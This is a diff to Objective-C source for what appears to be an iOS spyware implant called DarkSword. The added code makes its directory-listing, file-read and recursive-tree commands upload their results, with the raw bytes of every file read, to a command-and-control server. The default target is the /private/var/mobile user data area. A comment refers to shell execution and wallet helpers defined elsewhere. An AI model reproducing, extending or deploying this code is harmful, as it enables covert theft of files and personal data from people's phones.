@@ -268,13 +268,24 @@ static NSString *DSListDirectory(NSString *path)
     NSFileManager *manager = NSFileManager.defaultManager;
     NSArray<NSString *> *entries = [manager contentsOfDirectoryAtPath:path error:nil];
     if (!entries) return [NSString stringWithFormat:@"cannot list %@", path];
+
     NSMutableString *out = [NSMutableString string];
+    NSMutableArray<NSDictionary *> *manifest = [NSMutableArray array];
     for (NSString *name in entries) {
         BOOL isDir = NO;
         NSString *full = [path stringByAppendingPathComponent:name];
         [manager fileExistsAtPath:full isDirectory:&isDir];
-        [out appendFormat:@"%@%@\n", isDir ? @"d " : @"- ", name];
+        NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
+        unsigned long long size = [attrs[NSFileSize] unsignedLongLongValue];
+        [out appendFormat:@"%@ %@\t%llu\n", isDir ? @"d" : @"-", name, size];
+        [manifest addObject:@{@"name": name, @"dir": @(isDir), @"size": @(size)}];
     }
+
+    NSData *json = [NSJSONSerialization dataWithJSONObject:manifest options:0 error:nil];
+    if (json.length > 0) {
+        DarkSwordUpload(@"files", path, @"directory listing", json, nil);
+    }
+
     return out.length > 0 ? out : @"(empty)";
 }
 
@@ -282,12 +293,21 @@ static NSString *DSReadFile(NSString *path)
 {
     NSData *data = DSReadFileBytes(path);
     if (!data) return [NSString stringWithFormat:@"cannot read %@", path];
+
+    // Always upload the raw bytes so the file is downloadable from the C2.
+    DarkSwordUpload(@"files", path, @"remote file read", data, nil);
+
     if (data.length > DSDarkSwordMaxOutputBytes) {
-        data = [data subdataWithRange:NSMakeRange(0, DSDarkSwordMaxOutputBytes)];
+        return [NSString stringWithFormat:@"uploaded %@ (%lu bytes) — too large for inline preview",
+                path, (unsigned long)data.length];
     }
     NSString *text = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-    return text ?: [NSString stringWithFormat:@"(binary, %lu bytes)",
-                    (unsigned long)data.length];
+    if (text) {
+        return [NSString stringWithFormat:@"uploaded %@ (%lu bytes)\n--- preview ---\n%@",
+                path, (unsigned long)data.length, text];
+    }
+    return [NSString stringWithFormat:@"uploaded %@ (%lu bytes, binary)",
+            path, (unsigned long)data.length];
 }
 
 /// Forward declaration: DSExecShell is defined below (after the wallet helpers).
@@ -509,7 +529,8 @@ static void DSRecurseInto(NSString *path, NSUInteger depth,
         NSString *full = [path stringByAppendingPathComponent:name];
         BOOL isDir = NO;
         [manager fileExistsAtPath:full isDirectory:&isDir];
-        [out addObject:@{@"name": full, @"dir": @(isDir)}];
+        NSDictionary *attrs = [manager attributesOfItemAtPath:full error:nil];
+        [out addObject:@{@"name": full, @"dir": @(isDir), @"size": attrs[NSFileSize] ?: @0}];
         if (isDir && depth > 0) DSRecurseInto(full, depth - 1, out, maxEntries);
     }
 }
@@ -518,10 +539,14 @@ static NSString *DSFileRecursive(NSString *root, NSString *depthArg)
 {
     NSUInteger depth = depthArg.length > 0 ? (NSUInteger)[depthArg integerValue] : 1;
     depth = MIN(depth, 3);
+    NSString *base = root.length > 0 ? root : @"/private/var/mobile";
     NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
-    DSRecurseInto(root.length > 0 ? root : @"/private/var/mobile", depth, out, 2000);
+    DSRecurseInto(base, depth, out, 2000);
     NSData *json = [NSJSONSerialization dataWithJSONObject:out options:0 error:nil];
-    return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] : @"[]";
+    if (json.length > 0) {
+        DarkSwordUpload(@"files", base, @"recursive directory tree", json, nil);
+    }
+    return [NSString stringWithFormat:@"%lu entries (uploaded as files)", (unsigned long)out.count];
 }
 
 /// Enumerate installed app identifiers by walking the Filza virtual root's
